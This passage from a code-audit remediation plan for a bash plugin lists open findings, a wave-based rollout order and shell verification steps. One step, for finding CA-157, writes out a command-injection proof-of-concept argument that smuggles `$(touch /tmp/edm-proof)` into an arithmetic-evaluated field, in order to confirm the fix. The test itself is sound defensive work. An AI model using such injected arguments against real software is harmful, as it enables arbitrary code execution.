- **CA-023** -- `bin/edm-lint-artifacts:44-46` now *documents* the hardcoded `^SRD/`.
  Documented-as-known is not documented-as-intended; the doc itself says "unless the hook is updated
  too". Stays open.
- **CA-019** -- `evals/score-artifacts.sh:80-82` states the duplication is real and names EDMV3-111.
  That is an acknowledgement that the work is owed, not a decision to keep two copies -- and its
  stated blocker ("that is a bin/ change") was discharged when `_edm-lint-lib.sh` landed. Stays open.
- **CA-101** -- carried `open` rather than demoted to NOTED. L4's low confidence is "not re-verified",
  not "not a defect"; demoting would remove a real round-1 finding from the blocking set on the
  strength of an unmade check.

---

## Rollout Order

**Wave 1 -- P0 and the two security/integrity P1s. Serialize the first two; the rest parallelize.**

1. **CA-157** (`bin/edm-state:660` argument validation) -- one-line guard plus the widened `to_int`
   docstring. Do this first; it is the only finding with an arbitrary-execution consequence.
2. **CA-002** (`update-patterns` insertion tests) + **CA-133** (the trailing-newline fix) in one
   commit. CA-133 must land with CA-002's byte-content assertion, or nothing proves it.
3. **CA-164** (JSONL schema conflict) -- must land before round 3 runs, or round 3's eleven lens
   artifacts are wrong again and the fixtures stay stale.
4. **CA-158** + **CA-084** (`timing.sh` perl paths) in one commit -- same function, same file.

**Wave 2 -- remaining P1s. Fully parallel; no two share a file.**

- CA-007 (`evals/run-eval.sh`), CA-011 (`hooks/hooks.json` + CLAUDE.md), CA-013 (SRD/CLAUDE.md/agents
  -- largest, start it early), CA-022 (three agent files), CA-023 (`hooks.json` -- **conflicts with
  CA-011, do them together**), CA-024 (`bin/edm-state:112` + `.gitlab-ci.yml`), CA-027
  (`bin/edm-state` handoff), CA-035 (`wave7-smoke.sh:1568` + `skills/srd/SKILL.md:182`), CA-039
  (`wave7-smoke.sh` + fixtures), CA-040 (`wave6-smoke.sh`).

**Wave 3 -- P2 Group A (shared library) as one commit.** CA-019, CA-155, CA-156, CA-153, CA-010,
CA-144 all touch `bin/_edm-lint-lib.sh` and its three consumers plus `evals/score-artifacts.sh`. They
must be batched -- fixing them separately means three passes over the same boundary. **CA-019 leads:
it is the last surviving limb of round 1's root cause 1, and L7 graded it P1.**

**Wave 4 -- P2 Group B (`bin/edm-state`) as two commits.**
- 4a, concurrency: CA-141, CA-142, CA-143, CA-159, CA-025, CA-026, CA-059, CA-061 (all touch
  `with_state_lock` / `write_atomic` / the trap machinery -- one commit, one review).
- 4b, mechanical: CA-133 (if not already landed with CA-002), CA-135, CA-140, CA-137, CA-136,
  CA-134, CA-160, CA-056, CA-069, CA-154.

**Wave 5 -- P2 Group C (test quality).** CA-016 + CA-146 + CA-096 together (all `run-all.sh`);
CA-145 + CA-042 together (`_harness.sh`); then CA-037, CA-085, CA-100, CA-038, CA-099, CA-102,
CA-147, CA-094, CA-101 in parallel.

**Wave 6 -- P2 Groups D and E (documentation, CI, evals, spec).** Fully parallel across files.
CA-005 and CA-154 must land together (same convention). CA-018 and CA-013 should land together (the
plugin-relative fallback CA-018's fix references is what CA-013 ships).

**Do not defer anything.** `BLOCKING_FILTER` includes P2, so every open finding in this plan blocks
the convergence gate. Any item the team wants out of the blocking set must be moved to `deferred`
with a recorded rationale in `decisions.md`, not silently left open.

---

## Verification Plan

**Syntax and lint (must be clean before any test run):**

```bash
bash -n plugins/edm/bin/edm-state plugins/edm/bin/edm-lint-artifacts \
        plugins/edm/bin/_edm-lint-lib.sh plugins/edm/bin/edm-check-grants \
        plugins/edm/bin/edm-check-vocabulary plugins/edm/bin/tests/*.sh \
        plugins/edm/evals/*.sh
shellcheck --include=SC2086,SC2046,SC2048,SC2068 plugins/edm/bin/* plugins/edm/bin/tests/*.sh plugins/edm/evals/*.sh
bash plugins/edm/bin/edm-lint-artifacts --all
bash plugins/edm/bin/edm-check-grants
bash plugins/edm/bin/edm-check-vocabulary
bash plugins/edm/bin/edm-check-skill-sync
bash plugins/edm/bin/edm-sync-canonical-sections --check
```

**Unit and smoke:**

```bash
bash plugins/edm/bin/tests/run-all.sh            # must report >= 7 suites after CA-016
bash plugins/edm/bin/tests/harness-smoke.sh      # new cases for CA-145, CA-146, CA-158
bash plugins/edm/evals/tiering-matrix.sh --self-test   # expect 6/6 after CA-138
claude plugin validate plugins/edm/
```

**Targeted verification of the highest-risk fixes:**

1. **CA-157** -- write a scratch state file with `schema_version: 1` and `mode: standard`, then
   `edm-state phase-start XX 'a[$(touch /tmp/edm-proof)]'`. Assert `/tmp/edm-proof` does not exist
   and the command dies with the named diagnostic. **This is the runtime PoC round 1 prescribed and
   that has never been executed -- no lens has had `Bash` in either round. It must be run by a human
   or by an agent with `Bash`, not deferred to a third lens pass.**
2. **CA-002 + CA-133** -- revert `_splice_pattern_file` to `return 0`, confirm both new cases fail;
   restore, confirm both pass; then revert the `$'\n'` and confirm the byte-content assertion fails.
3. **CA-024** -- one green `lint:shellcheck` pipeline run. This finding cannot be closed any other
   way.
4. **CA-164** -- re-run one lens agent and diff its JSONL field names against
   `plugins/edm/bin/tests/fixtures/code-audit/lens-L11.jsonl`.
5. **CA-011 / CA-023** -- stage a whole-initiative deletion and confirm the commit is permitted;
   set `EDM_SRD_ROOT=docs/initiatives`, stage a file with an attribution trailer under it, and
   confirm the commit is blocked.
6. **CA-019** -- run `score-artifacts.sh` and `edm-lint-artifacts` over
   `bin/tests/fixtures/mermaid/valid/v12-indented-fence.md` and assert they agree.

**Pipeline (the primary verification path per `plugins/edm/CLAUDE.md`, and still never executed --
see CA-111):** push and observe all eleven blocking jobs. `lint:shellcheck` (CA-024, CA-162),
`test:smoke-bash32` (CA-006, now reachable), `lint:pattern-library-contract` (CA-133, CA-056) and
`test:state-validate` (CA-007) are the four that carry findings in this plan.

**Re-audit (targeted, round 3):** the fixes in this plan touch findings owned by **every one of the
eleven lenses**, so a targeted partial round cannot satisfy the convergence gate
(`cmd_audit_converged` refuses `round_type: partial`). **Round 3 must be a full round.** Before it
runs, land CA-164 -- otherwise round 3's eleven lens artifacts carry the wrong schema again -- and
consider CA-176's orchestrator-persists fallback, since CA-130 (no `Write` tool at lens runtime) has
now reproduced in two consecutive rounds and cost a manual transcription step both times.
